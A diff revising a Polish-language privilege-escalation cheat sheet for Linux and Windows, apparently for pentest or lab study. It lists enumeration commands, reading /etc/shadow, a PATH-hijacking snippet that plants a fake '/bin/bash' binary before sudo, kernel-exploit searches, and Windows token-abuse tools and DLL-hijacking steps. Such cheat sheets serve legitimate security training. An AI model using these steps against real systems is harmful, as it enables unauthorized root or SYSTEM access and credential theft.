@@ -1,21 +1,21 @@
-🐧 LINUX PRIVESC – 1 STRONA A4 CHEATSHEET
+🐧 Linux PrivEsc Cheatsheet (1 strona A4)
 🔍 1. Informacje o systemie
-uname -a              # Kernel – sprawdź podatności
-cat /etc/os-release   # Dystrybucja
+uname -a              # kernel – możliwe exploity
+cat /etc/os-release   # dystrybucja
 hostnamectl
 
 👤 2. Użytkownicy / uprawnienia
 id
 whoami
-sudo -l               # KLUCZOWE – błędne sudo = ROOT
+sudo -l               # najważniejsze!
 cat /etc/passwd
-cat /etc/shadow       # jeśli masz dostęp = wygrana
+cat /etc/shadow       # jackpot jeśli dostępne
 
 📦 3. SUID / SGID
 find / -perm -4000 -type f 2>/dev/null
 
 
-Sprawdź w GTFOBins (najczęstsze rootowanie):
+Najczęstsze rootowanie (wrzuć na GTFOBins):
 
 vim, find, nmap, python, perl, bash
 
@@ -38,21 +38,15 @@ crontab -l
 ls -la /etc/cron*
 
 
-Jeśli cron uruchamia edytowalny plik → ROOT.
+Edytowalny skrypt → ROOT.
 
-📁 6. Uprawnienia do plików
+📁 6. Uprawnienia plików
 find / -writable -type f 2>/dev/null
 find / -writable -type d 2>/dev/null
 
-
-Edytowalne skrypty systemowe = eskalacja.
-
-🛠️ 7. Usługi / procesy
+🛠️ 7. Usługi i procesy
 ss -tulpn
 ps aux
-
-
-Słabe serwisy działające jako root → exploity lokalne / kernelowe.
 
 🧵 8. PATH Hijacking
 echo '/bin/bash' > fake
@@ -60,29 +54,23 @@ chmod +x fake
 export PATH=.:$PATH
 sudo <komenda>
 
-🎯 9. Kernel Exploits (LAB only)
+🎯 9. Kernel Exploits (lab only)
 uname -r
 searchsploit linux kernel
 
+✔️ Przydatne strony
 
-Dirty COW, Dirty Pipe, OverlayFS, itp.
+https://gtfobins.github.io
 
-✔️ Najważniejsze narzędzia
+https://book.hacktricks.xyz
 
-GTFOBins
+https://github.com/swisskyrepo/PayloadsAllTheThings
 
-HackTricks Linux
-
-PayloadAllTheThings
-
-🪟 WINDOWS PRIVESC – 1 STRONA A4 CHEATSHEET
+🪟 Windows PrivEsc Cheatsheet (1 strona A4)
 🔍 1. Informacje o systemie
 systeminfo
 hostname
 whoami /all
-
-
-Szukaj: brakujących łatek, starych buildów, podatnych uprawnień.
 
 👥 2. Użytkownicy / grupy
 net users
@@ -99,43 +87,37 @@ SeImpersonatePrivilege
 
 SeAssignPrimaryTokenPrivilege
 
-→ Użyj: PrintSpoofer / JuicyPotato / RoguePotato
+→ użyj: PrintSpoofer / JuicyPotato / RoguePotato
 
-⏰ 4. Scheduled Tasks (cron Windows)
+⏰ 4. Scheduled Tasks
 schtasks /query /fo LIST /v
 
 
-Edytowalny task uruchamiany jako SYSTEM = eskalacja.
+Editowalny .bat/.ps1 → SYSTEM.
 
 🧮 5. Usługi
 sc query
 tasklist /v
 
 
-Możliwe:
+Często prowadzi do:
 
 DLL Hijacking
 
-Nadpisywanie binarki usługi
+Nadpisywania binarki usługi
 
-📁 6. Uprawnienia do plików i katalogów
+📁 6. Uprawnienia plików
 icacls <plik>
 icacls C:\ /findsid <user>
 
-
-Jeśli możesz nadpisać plik usługi → SYSTEM.
-
-🔌 7. Porty / lokalne usługi
+🔌 7. Porty / usługi lokalne
 netstat -ano
-
-
-Słuchające usługi debug/RPC/WCF → lokalne exploity + privesc.
 
 🧵 8. DLL Hijacking
 
-Edytowalny folder w ścieżce ładowania DLL → własna DLL → restart usługi → SYSTEM.
+Edytowalna ścieżka → własna DLL → restart usługi → SYSTEM.
 
-📦 9. Must‑have narzędzia
+📦 Narzędzia Windows PrivEsc
 
 WinPEAS
 
@@ -149,8 +131,8 @@ Watson
 
 ✔️ Najważniejsze strony
 
-LOLBAS
+https://lolbas-project.github.io
 
-HackTricks Windows
+https://book.hacktricks.xyz
 
-PayloadAllTheThings
+https://github.com/swisskyrepo/PayloadsAllTheThings
